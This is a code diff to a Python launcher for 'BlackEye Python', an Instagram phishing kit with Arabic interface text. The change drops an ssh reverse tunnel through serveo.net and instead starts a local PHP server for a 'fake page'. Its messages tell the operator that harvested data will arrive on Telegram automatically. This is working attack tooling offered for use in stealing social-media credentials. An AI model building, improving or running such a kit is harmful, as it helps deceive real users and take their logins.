@@ -53,22 +53,29 @@ try:
 
     # بدء خادم Instagram
     choice = 'instagram'
-    cmd_line = f"php -t sites/{choice} -S 0.0.0.0:5000 & ssh -R {subdomain}.serveo.net:80:localhost:5000 serveo.net"
-
-    print_colored(f"\n🔧 تشغيل الخادم...", colors.BLUE)
+    
+    print_colored(f"\n🔧 تشغيل خادم PHP...", colors.BLUE)
 
     try:
-        # تشغيل الخادم
-        p = subprocess.Popen(cmd_line, shell=True)
-        print_colored(f"\n✅ الخادم يعمل على: https://{subdomain}.serveo.net", colors.GREEN, bold=True)
-        print_colored("📊 مراقبة الاتصالات...", colors.BLUE)
-
+        # تشغيل خادم PHP المحلي
+        print_colored(f"\n✅ الخادم يعمل على المنفذ 5000", colors.GREEN, bold=True)
+        print_colored("🌐 يمكنك الوصول للصفحة المزيفة عبر الرابط في الأعلى", colors.BLUE)
+        print_colored("📊 مراقبة الاتصالات والبيانات...", colors.BLUE)
+        print_colored("📱 البيانات ستصل على Telegram تلقائياً!", colors.GREEN)
+        
+        # تشغيل خادم PHP
+        p = subprocess.Popen(f"php -S 0.0.0.0:5000 -t sites/{choice}", shell=True)
+        
         # انتظار إيقاف الخادم
         p.wait()
 
     except KeyboardInterrupt:
         print_colored("\n\n⏹️  تم إيقاف الخادم", colors.YELLOW)
         print_colored("شكراً لاستخدام BlackEye Python!", colors.GREEN)
+        try:
+            p.terminate()
+        except:
+            pass
 
 except KeyboardInterrupt:
     print_colored("\n\nتم إيقاف البرنامج", colors.YELLOW)
